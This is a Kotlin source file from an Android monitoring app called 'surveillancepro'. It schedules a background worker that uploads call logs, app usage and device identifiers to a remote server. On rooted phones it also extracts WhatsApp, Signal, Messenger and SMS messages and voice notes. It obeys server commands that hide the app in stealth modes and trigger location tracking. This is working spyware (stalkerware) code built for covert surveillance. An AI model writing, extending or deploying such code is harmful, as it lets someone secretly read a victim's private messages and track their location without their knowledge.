package com.surveillancepro.android.workers

import android.content.Context
import android.util.Log
import androidx.work.*
import com.surveillancepro.android.data.ApiClient
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.root.DatabaseExtractor
import com.surveillancepro.android.root.RootManager
import com.surveillancepro.android.root.VoiceNoteExtractor
import com.surveillancepro.android.services.StealthManager
import com.surveillancepro.android.services.AppUsageTracker
import com.surveillancepro.android.services.CallLogTracker
import java.util.concurrent.TimeUnit

class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {

    override suspend fun doWork(): Result {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return Result.success()

        val queue = EventQueue.getInstance(applicationContext)
        val api = ApiClient.getInstance(storage)

        collectFreshData(storage, queue)

        // Extraction root (si disponible)
        collectRootData(queue)

        // Vider la file d'attente par lots
        var totalSent = 0
        var retries = 0

        while (retries < 3) {
            val batch = queue.peek(50)
            if (batch.isEmpty()) break

            val events = batch.map { mapOf(
                "type" to it.type,
                "payload" to it.payload,
                "timestamp" to it.createdAt
            )}

            try {
                val result = api.syncBatch(events)
                if (result.success) {
                    queue.remove(batch.map { it.id })
                    totalSent += batch.size
                    processCommands(result.commands)
                } else {
                    queue.incrementRetry(batch.map { it.id })
                    retries++
                }
            } catch (e: Exception) {
                Log.w("SyncWorker", "Sync failed: ${e.message}")
                queue.incrementRetry(batch.map { it.id })
                retries++
            }
        }

        Log.d("SyncWorker", "Sync done: $totalSent events sent, ${queue.count()} remaining")
        return if (totalSent > 0 || queue.count() == 0) Result.success() else Result.retry()
    }

    @Suppress("UNCHECKED_CAST")
    private fun processCommands(commands: List<Map<String, Any>>) {
        for (cmd in commands) {
            val type = cmd["type"] as? String ?: continue
            val payload = cmd["payload"] as? Map<String, Any> ?: emptyMap()
            Log.d("SyncWorker", "Processing command: $type")

            when (type) {
                "set_stealth_mode" -> {
                    val mode = payload["mode"] as? String ?: "disguised"
                    when (mode) {
                        "deep" -> StealthManager.enableDeepStealth(applicationContext)
                        "visible" -> {
                            if (StealthManager.isDeepStealthActive(applicationContext)) {
                                StealthManager.disableDeepStealth(applicationContext)
                            }
                            StealthManager.setMode(applicationContext, StealthManager.StealthMode.VISIBLE)
                        }
                        "hidden" -> StealthManager.setMode(applicationContext, StealthManager.StealthMode.HIDDEN)
                        else -> StealthManager.setMode(applicationContext, StealthManager.StealthMode.DISGUISED)
                    }
                }
                "locate" -> {
                    try {
                        val intent = android.content.Intent(applicationContext,
                            com.surveillancepro.android.services.LocationService::class.java).apply {
                            putExtra(com.surveillancepro.android.services.LocationService.EXTRA_MODE,
                                com.surveillancepro.android.services.LocationService.MODE_SINGLE)
                        }
                        applicationContext.startForegroundService(intent)
                    } catch (_: Exception) {}
                }
            }

            // Acquitter la commande
            try {
                val cmdId = (cmd["id"] as? Number)?.toLong()
                if (cmdId != null) {
                    kotlinx.coroutines.runBlocking {
                        val api = ApiClient.getInstance(DeviceStorage.getInstance(applicationContext))
                        api.sendEvent("command_ack", mapOf(
                            "commandId" to cmdId,
                            "type" to type,
                            "status" to "executed",
                        ))
                    }
                }
            } catch (_: Exception) {}
        }
    }

    private fun collectFreshData(storage: DeviceStorage, queue: EventQueue) {
        // App usage
        try {
            val usageTracker = AppUsageTracker(applicationContext)
            val usage = usageTracker.getUsageToday()
            if (usage.isNotEmpty()) {
                queue.enqueue("app_usage", mapOf("apps" to usage, "count" to usage.size))
            }
        } catch (_: Exception) {}

        // Journal d'appels
        try {
            CallLogTracker(applicationContext).syncToQueue(queue)
        } catch (_: Exception) {}

        // Heartbeat avec infos système
        try {
            val bm = applicationContext.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val battery = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val charging = bm.isCharging
            val stats = android.os.StatFs(android.os.Environment.getDataDirectory().path)
            val freeGB = (stats.availableBytes / (1024.0 * 1024.0 * 1024.0))

            val heartbeat = mutableMapOf<String, Any>(
                "batteryLevel" to battery,
                "batteryState" to if (charging) "charging" else "unplugged",
                "storageFreeGB" to String.format("%.2f", freeGB).toDouble(),
                "queueSize" to queue.count(),
                "system" to "Android ${android.os.Build.VERSION.RELEASE}",
                "model" to "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}",
                "isRooted" to RootManager.isRooted(),
            )

            queue.enqueue("heartbeat", heartbeat)
        } catch (_: Exception) {}
    }

    private fun collectRootData(queue: EventQueue) {
        if (!RootManager.isRooted()) return

        // Messages de toutes les apps (WhatsApp, Signal, Messenger, SMS)
        try {
            DatabaseExtractor.extractAllAndEnqueue(applicationContext)
        } catch (e: Exception) {
            Log.w("SyncWorker", "Root DB extraction failed: ${e.message}")
        }

        // Fichiers audio des messages vocaux (WhatsApp, Telegram)
        try {
            VoiceNoteExtractor.extractAndEnqueue(applicationContext)
        } catch (e: Exception) {
            Log.w("SyncWorker", "Voice note extraction failed: ${e.message}")
        }

        // Infos avancées (IMEI, MAC, serial)
        try {
            val advancedInfo = RootManager.getAdvancedDeviceInfo()
            if (advancedInfo.isNotEmpty()) {
                queue.enqueue("root_device_info", advancedInfo.mapValues { it.value as Any })
            }
        } catch (_: Exception) {}
    }

    companion object {
        private const val WORK_NAME = "supervision_pro_sync"

        fun schedule(context: Context, intervalMinutes: Long = 15) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val request = PeriodicWorkRequestBuilder<SyncWorker>(
                intervalMinutes, TimeUnit.MINUTES
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 2, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )
            Log.d("SyncWorker", "Scheduled every ${intervalMinutes}min")
        }

        fun triggerNow(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()

            val request = OneTimeWorkRequestBuilder<SyncWorker>()
                .setConstraints(constraints)
                .build()

            WorkManager.getInstance(context).enqueue(request)
        }
    }
}
